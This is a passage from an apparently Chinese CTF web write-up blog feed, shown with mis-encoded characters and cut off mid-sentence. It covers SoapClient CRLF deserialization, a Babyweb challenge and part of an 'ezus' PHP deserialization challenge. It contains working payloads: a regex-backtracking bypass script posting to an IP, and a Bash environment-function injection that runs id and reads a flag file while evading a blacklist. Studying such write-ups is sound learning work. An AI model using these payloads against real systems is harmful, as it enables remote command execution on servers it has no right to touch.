href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0">ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨</a></p><p><strong>SoapClient</strong></p><p>è¿™ä¸ªä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œphp5ã€7éƒ½å­˜åœ¨æ­¤ç±»ã€‚è¿™ä¸ªå†…ç½®ç±»é‡Œé¢ä¹Ÿæœ‰ä¸€äº›è‡ªå¸¦çš„é­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚ï¼Œ__call.å¯ä»¥ååºåˆ—åŒ–è¿™ä¸ªå†…ç½®ç±»ç„¶åé€šè¿‡ä¸€äº›æ–¹æ³•æ¥è°ƒç”¨é­”æ³•å‡½æ•°æ¥è¾¾åˆ°ç›®çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://example.com:5555&#x27;, &#x27;location&#x27;=&gt;&#x27;http://example.com:5555/aaa&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line">             //è°ƒç”¨äº†cé‡Œé¢ä¸å­˜åœ¨çš„å‡½æ•°aï¼Œè·³è¿›cä¹Ÿå°±æ˜¯SoapClienté‡Œé¢çš„__call()</span><br><span class="line">             //å‘ç°SOAPActionå‚æ•°å¯æ§ï¼Œå¯ä»¥åœ¨SOAPActionå¤„æ³¨å…¥æ¶æ„çš„æ¢è¡Œ</span><br><span class="line">             //è¿™æ ·ä¸€æ¥æˆ‘ä»¬POSTæäº¤çš„headerå°±æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ³¨å…¥æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ“ä½œäº†ã€‚(CRLF)</span><br></pre></td></tr></table></figure><h5 id="CRLFæ”»å‡»"><a href="#CRLFæ”»å‡»" class="headerlink" title="CRLFæ”»å‡»"></a>CRLFæ”»å‡»</h5><p>ä»€ä¹ˆæ˜¯<strong>CRLF</strong>ï¼Œå…¶å®å°±æ˜¯å›è½¦å’Œæ¢è¡Œé€ æˆçš„æ¼æ´ï¼Œåå…­è¿›åˆ¶ä¸º<code>0x0d,0x0a</code> ï¼Œåœ¨HTTPå½“ä¸­<code>header</code>å’Œ<code>body</code>ä¹‹é—´å°±æ˜¯ä¸¤ä¸ªCRLFåˆ†å‰²çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯cookieå’Œhtmlä»£ç ï¼Œæ‰€ä»¥crlf injection åˆå«åš HTTP Response Splittingã€‚</p><p>å…¶å®å°±æ˜¯åˆ©ç”¨httpè¯·æ±‚çš„å›ºå®šæ ¼å¼è¦æ±‚æ¥æ¤å…¥æ¶æ„ä»£ç ã€‚</p><p>soapï¼šç®€å•å¯¹è±¡è®¿é—®åè®®ï¼› -ã€‹åº•å±‚é€šè®¯é€»è¾‘ä¸ºhttp</p><p>å› æ­¤å¯ä»¥é€šè¿‡<strong>æ§åˆ¶soapactionçš„å‚æ•°</strong>ï¼Œåœ¨SOAPActionå¤„æ³¨å…¥æ¶æ„çš„<strong>æ¢è¡Œ</strong>ï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬POSTæäº¤çš„headerå°±æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ³¨å…¥æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ“ä½œäº†ã€‚</p><hr><h2 id="Babyweb-2023å®‰æ´µæ¯æ˜¥å­£èµ›"><a href="#Babyweb-2023å®‰æ´µæ¯æ˜¥å­£èµ›" class="headerlink" title="Babyweb(2023å®‰æ´µæ¯æ˜¥å­£èµ›)"></a>Babyweb(2023å®‰æ´µæ¯æ˜¥å­£èµ›)</h2><p>ä¸¤ä¸ªPHP</p><h3 id="PHP1-0"><a href="#PHP1-0" class="headerlink" title="PHP1.0"></a>PHP1.0</h3><h5 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230308203346357.png"></p><h5 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h5><p>éœ€è¦postä¸€ä¸ªheiziï¼Œä½œä¸ºå˜é‡a</p><p>açš„å‰äº”é¡¹æ˜¯aikun</p><p>açš„æœ€ååé¡¹æ˜¯xiaojijiao</p><p>ä¸­é—´åŠ ä¸œè¥¿</p><p>ç›®æ ‡æ˜¯ç»•è¿‡ï¼š<code>preg_match(&#39;/aikun+?xiaojijiao/is&#39;,$a)</code>,ä¸èƒ½è®©è¿™ä¸ªæ¡ä»¶æ»¡è¶³ï¼Œä½†æ˜¯å®é™…ä¸Šä¼ çš„aåˆå¿…é¡»æ˜¯è¿™ä¸ªå½¢å¼çš„ã€‚å°±æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šgrep_matchå›æº¯æ¬¡æ•°ç»•è¿‡</p><p><a href="https://blog.csdn.net/yourdawntown/article/details/120558237">æ­£åˆ™å›æº¯æ¬¡æ•°ç»•è¿‡</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_matchç»•è¿‡æ€»ç»“</a></p><p>.+?æ˜¯æƒ°æ€§åŒ¹é…ï¼Œæ­£åˆ™åŒ¹é…ä¼šå°½å¯èƒ½å°‘çš„å»åŒ¹é…ã€‚å›æº¯åŒ¹é…æŒ‡å…ˆå¯¹ç›®æ ‡å­—ç¬¦ä¸²é¡ºåºåŒ¹é…ï¼ŒåŒ¹é…åˆ°ç›®æ ‡ä¹‹åå†å€’å›å»çœ‹ä¸Šä¸€ä¸ªåŒ¹é…çš„ã€‚</p><p>æœ€æ–°çš„PHPæ–‡æ¡£é‡Œè§„å®šäº†æ­£åˆ™åŒ¹é…æœ€å¤§å›æº¯æ¬¡æ•°æ˜¯ä¸€ç™¾ä¸‡ä¹Ÿå°±æ˜¯1000000ï¼Œè¶…è¿‡è¿™ä¸ªå€¼å°±ä¸å†å›æº¯ã€‚</p><p>å¯¹äºæœ¬é¢˜å¦‚æœä¸­é—´æœ‰1000000ä¸ªå…¶ä»–å­—ç¬¦ï¼Œåˆ™åŒ¹é…åˆ°æœ€åä¸€ä¸ªæ—¶å¼€å§‹å›æº¯ï¼Œå›æº¯åˆ°ç¬¬ä¸€ç™¾ä¸‡åœæ­¢å›æº¯ï¼Œæ­¤æ—¶è¿˜æ²¡å›æº¯åˆ°åº”è¯¥åŒ¹é…çš„å“ªä¸€ä¸ªå­—ç¬¦ï¼Œå‡½æ•°è¿”å›åŒ¹é…å¤±è´¥ï¼ŒæˆåŠŸç»•è¿‡ã€‚</p><h5 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Â #!/usr/bin/env python</span><br><span class="line">Â # -*- coding:utf-8 -*-</span><br><span class="line">Â # auther:psych</span><br><span class="line">Â # time:2023/3/1</span><br><span class="line">Â â€‹</span><br><span class="line">Â import requests</span><br><span class="line">Â import re</span><br><span class="line">Â url = &#x27;http://182.148.156.200:9134/&#x27;</span><br><span class="line">Â a = requests.Session()</span><br><span class="line">Â payload = &#123;&#x27;heizi&#x27;: &quot;aikun&quot; + &quot;a&quot;*1000000 + &quot;xiaojijiao&quot;&#125; Â  Â  Â //æ³¨æ„å›æº¯ä¸Šé™æ˜¯ä¸€ç™¾ä¸‡</span><br><span class="line">Â print(a.post(url, payload).text)</span><br></pre></td></tr></table></figure><h3 id="PHP2-0"><a href="#PHP2-0" class="headerlink" title="PHP2.0"></a>PHP2.0</h3><p>æ‰¾ä¸åˆ°æºç äº†ï¼Œå…·ä½“çš„å…³é”®çš„ä»£ç å°±ä¸€å¥ï¼Œç±»ä¼¼ä¸‹é¢è¿™ä¸ªï¼š</p><h5 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â foreach($_REQUEST[&#x27;envs&#x27;] as $key =&gt; $val) &#123;</span><br><span class="line">Â  Â  Â putenv(&quot;&#123;$key&#125;=&#123;$val&#125;&quot;);</span><br><span class="line">Â &#125;</span><br><span class="line">Â //... ä¸€äº›å…¶ä»–ä»£ç </span><br><span class="line">Â system(&#x27;echo hello&#x27;);</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªå¯ç–‘ç‚¹ï¼š</p><blockquote><ul><li>envs,ç¯å¢ƒå˜é‡åº”è¯¥æ˜¯å…¶ä¸­ä¸€ä¸ªçªç ´å£</li><li>ä¸€ä¸ªechoå‡½æ•°æœ¬æ¥å¯ä»¥ç›´æ¥å†™ï¼Œç»“æœéè¦å¥—ä¸€ä¸ªsystemã€‚ã€‚è‚¯å®šæœ‰é—®é¢˜</li></ul></blockquote><p>é¦–å…ˆæ˜¯å…³äºç¯å¢ƒå˜é‡çš„ä¸€äº›æ€è€ƒã€‚</p><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815448">LD_PRELOADç¯å¢ƒå˜é‡æ³¨å…¥</a></p><blockquote><p>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸€ä¸ª<strong>ç¯å¢ƒå˜é‡</strong>ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚</p></blockquote><blockquote><p>ç”¨äººè¯è®²ï¼ŒLD_PRELOADï¼Œæ˜¯ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºåŠ¨æ€åº“çš„åŠ è½½ï¼Œè€ŒåŠ¨æ€åº“åŠ è½½çš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥<strong>æŠ¢å…ˆåœ¨æ­£å¸¸å‡½æ•°æ‰§è¡Œä¹‹å‰ç‡å…ˆæ‰§è¡Œæˆ‘ä»¬çš„ç”¨ä»£ç å†™çš„å‡½æ•°</strong>ã€‚</p></blockquote><p>å› æ­¤æˆ‘ä»¬èƒ½åˆ©ç”¨LD_PRELOADåŠ«æŒå¹¶<strong>æ‰§è¡Œä»»æ„ä»£ç </strong>ã€‚ä½†é—æ†¾çš„æ˜¯ï¼Œè¿™é‡Œæ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œæˆ‘ä»¬å‹æ ¹å°±ä¸å¯èƒ½æ•´ä¸ªLD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;hj.jpgä¸Šå»ã€‚è¿™å°±æ˜¯å¦‚ä»Šçš„é—®é¢˜æ‰€åœ¨ï¼Œæ€ä¹ˆåœ¨<strong>æ²¡æœ‰ç»™ä¸Šä¼ æ¥å£</strong>çš„æƒ…å†µä¸‹get shellã€‚</p><h5 id="ç¯å¢ƒå˜é‡æ³¨å…¥"><a href="#ç¯å¢ƒå˜é‡æ³¨å…¥" class="headerlink" title="ç¯å¢ƒå˜é‡æ³¨å…¥"></a>ç¯å¢ƒå˜é‡æ³¨å…¥</h5><p><a href="https://www.ctfiot.com/26843.html">https://www.ctfiot.com/26843.html</a></p><p>åœ¨å¤§ä½¬çš„åšå®¢ä¸­çœ‹äº†åŠå¤©æ²¡çœ‹æ‡‚ï¼Œåªèƒ½è¯´ç¾¡æ…•Linuxå†…æ ¸ç©å®¶ã€‚æœ€åæŠ„ä¸ªç»“è®ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309075600961.png"></p><p><a href="https://www.cnblogs.com/ziyunfei/p/4828767.html">bashä»ç¯å¢ƒå˜é‡ä¸­å¯¼å…¥å‡½æ•°</a></p><p>çœæµï¼š</p><ul><li>Bash æŠŠæ»¡è¶³ â€œBASH_FUNC_å‡½æ•°å%%ï¼(){ å‡½æ•°ä½“}æ ¼å¼çš„ç¯å¢ƒå˜é‡ä½œä¸ºå‡½æ•°æºç è§£æå¹¶å¯¼å…¥</li><li>ç„¶è€Œï¼Œæœ¬æ–‡æ‰€è®²çš„è¡¨ç°ä»…é€‚ç”¨äº Bash 4.3.30 åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œä¹‹å‰çš„ Bash ç‰ˆæœ¬åœ¨å¯¼å‡ºå‡½æ•°æ—¶ä¸ä¼šç»™å‡½æ•°ååŠ ä¸Š BASH_FUNC_ å‰ç¼€å’Œ %% åç¼€ï¼Œåœ¨å¯¼å…¥æ—¶ä¹Ÿä¸ä¼šè¯†åˆ«å‰ç¼€åç¼€ï¼Œåªè¦çœ‹åˆ° ï¼ å³è¾¹æ˜¯ â€œ() {â€œ è¿™å››ä¸ªå­—ç¬¦ï¼Œå°±æŒ‰å‡½æ•°å¯¼å…¥</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309085711588-1024x196.png"></p><p>è€Œè¿™ä¸ªé¢˜è¿˜æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œ</p><blockquote><p>åªä¸è¿‡å’Œ4.4ä»¥ä¸‹çš„æœ‰ä¸€å¤„å·®å¼‚ï¼š**Bash 4.4ä¸‹FUNCDEF_SUFFIXç­‰äº%%ï¼Œè€Œè¿™ä¸ª4.2çš„è¡¥ä¸ä¸­FUNCDEF_SUFFIXç­‰äº()**ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ä¸Šé¢å¤§ä½¬çš„payloadè¿˜è¦æ›´æ”¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â env=[BASH_FUNC_echo()]() &#123; id; &#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ‰§è¡Œäº†idï¼Œç°åœ¨çš„é—®é¢˜æ˜¯æ‰§è¡Œæ‰¾åˆ°flagå¹¶è¾“å‡ºã€‚</p><p>åŸé¢˜ç›®è¿˜åŠ ä¸Šäº†ä¸€äº›é»‘åå•ï¼Œcatå’Œflagéƒ½è¢«é™åˆ¶ï¼Œå°±ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ï¼Œå› ä¸ºå†…éƒ¨æ˜¯PHPä»£ç ï¼ŒPHPå­—ç¬¦ä¸²å¯ä»¥æ‹¼æ¥ã€‚</p><h5 id="æœ€ç»ˆpayload"><a href="#æœ€ç»ˆpayload" class="headerlink" title="æœ€ç»ˆpayload"></a>æœ€ç»ˆpayload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â env[BASH_FUNC_echo()]=()%20&#123;%20c=ca;d=t;a=fl;b=ag;$c$d%20/$a$b;%20&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ‹Ÿæ€-2022-web-éƒ¨åˆ†wp(æœªå®Œå¾…ç»­)</title>
      <link href="/2023/07/01/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2022-web-%E9%83%A8%E5%88%86wp%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD/"/>
      <url>/2023/07/01/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2022-web-%E9%83%A8%E5%88%86wp%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="ezus"><a href="#ezus" class="headerlink" title="ezus"></a>ezus</h1><hr><h2 id="é¢˜ç›®å†…å®¹"><a href="#é¢˜ç›®å†…å®¹" class="headerlink" title="é¢˜ç›®å†…å®¹"></a>é¢˜ç›®å†…å®¹</h2><h3 id="index-php-ç‚¹è¿›å»æ˜¯æºç "><a href="#index-php-ç‚¹è¿›å»æ˜¯æºç " class="headerlink" title="index.php ç‚¹è¿›å»æ˜¯æºç "></a>index.php ç‚¹è¿›å»æ˜¯æºç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â include &#x27;tm.php&#x27;; // Next step in tm.php </span><br><span class="line">Â if (preg_match(&#x27;/tm\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;]))</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â exit(&quot;no way!&quot;);</span><br><span class="line">Â &#125;</span><br><span class="line">Â if (isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â $path = basename($_SERVER[&#x27;PHP_SELF&#x27;]);</span><br><span class="line">Â  Â  Â if (!preg_match(&#x27;/tm.php$/&#x27;, $path) &amp;&amp; !preg_match(&#x27;/index.php$/&#x27;, $path))</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â exit(&quot;nonono!&quot;);</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â highlight_file($path);</span><br><span class="line">Â  Â  Â exit();</span><br><span class="line">Â &#125;</span><br><span class="line">Â ?&gt;</span><br><span class="line">Â &lt;a href=&quot;index.php?source&quot;&gt;Source&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="tm-php-ååºåˆ—åŒ–"><a href="#tm-php-ååºåˆ—åŒ–" class="headerlink" title="tm.php ååºåˆ—åŒ–"></a>tm.php ååºåˆ—åŒ–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â class UserAccount</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â protected $username;</span><br><span class="line">Â  Â  Â protected $password;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function __construct($username, $password)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;username = $username;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;password = $password;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â function object_sleep($str)</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â $ob = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;@0@0@0@&#x27;, $str);</span><br><span class="line">Â  Â  Â return $ob;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â function object_weakup($ob)</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â $r = str_replace(&#x27;@0@0@0@&#x27;, chr(0).&#x27;*&#x27;.chr(0), $ob);</span><br><span class="line">Â  Â  Â return $r;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â class order</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $f;</span><br><span class="line">Â  Â  Â public $hint;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function __construct($hint, $f)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;f = $f;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;hint = $hint;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function __wakeup()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â //something in hint.php</span><br><span class="line">Â  Â  Â  Â  Â if ($this-&gt;hint != &quot;pass&quot;  $this-&gt;f != &quot;pass&quot;) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $this-&gt;hint = &quot;pass&quot;;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $this-&gt;f = &quot;pass&quot;;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function __destruct()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â if (filter_var($this-&gt;hint, FILTER_VALIDATE_URL))</span><br><span class="line">Â  Â  Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $r = parse_url($this-&gt;hint);</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â if (!empty($this-&gt;f)) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â if (strpos($this-&gt;f, &quot;try&quot;) !== Â false &amp;&amp; strpos($this-&gt;f, &quot;pass&quot;) !== false) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â @include($this-&gt;f . &#x27;.php&#x27;);</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â   &#125; else &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â die(&quot;try again!&quot;);</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â if (preg_match(&#x27;/prankhub$/&#x27;, $r[&#x27;host&#x27;])) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â @$out = file_get_contents($this-&gt;hint);</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â echo &quot;&lt;br/&gt;&quot;.$out;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â   &#125; else &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â die(&quot;&lt;br/&gt;error&quot;);</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â  Â   &#125; else &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â die(&quot;try it!&quot;);</span><br><span class="line">Â  Â  Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â else</span><br><span class="line">Â  Â  Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo &quot;Invalid URL&quot;;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">Â $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">Â â€‹</span><br><span class="line">Â $user = serialize(new UserAccount($username, $password));</span><br><span class="line">Â unserialize(object_weakup(object_sleep($user)))</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><ul><li>é¢˜ç›®æš—ç¤ºæˆ‘ä»¬è®¿é—® &#x2F;tm.php</li><li>ç¬¬ä¸€ä¸ªifï¼Œç™¾åº¦å‘ç°<code>$_SERVER[&#39;PHP_SELF&#39;] è·å–å½“å‰é¡µé¢åœ°å€</code> ä¹Ÿå°±æ˜¯åœ°å€ä¸èƒ½ä»¥tm.phpç»“å°¾ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥è®¿é—®&#x2F;tm.php</li><li>ä¸‹é¢å°±æ˜¯åˆ¤æ–­è·¯å¾„æœ€åä¸€ä¸ªæ–‡ä»¶åæ˜¯ä¸æ˜¯tm.phpï¼Œå¦‚æœæ˜¯å°±è¿”å›no way,è¯´æ˜ä¸èƒ½ç›´æ¥è®¿é—®</li><li>å‡ºç°äº†ä¸€ä¸ª<code>source</code> å˜é‡ï¼Œ é‡Œé¢çš„å…³é”®æ˜¯<code>highlight_file($path);</code> ä¸­é—´ifæ²¡å•¥ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ç›®çš„åªæ˜¯è®©<code>path=tm.php</code></li><li>ç½‘ä¸Šwpè¯´ï¼š<code>basename()</code>åœ¨<code>Linux</code>ä¸‹ï¼Œå¦‚æœå–å¾—çš„æ–‡ä»¶åå¼€å¤´æ˜¯éASCIIç 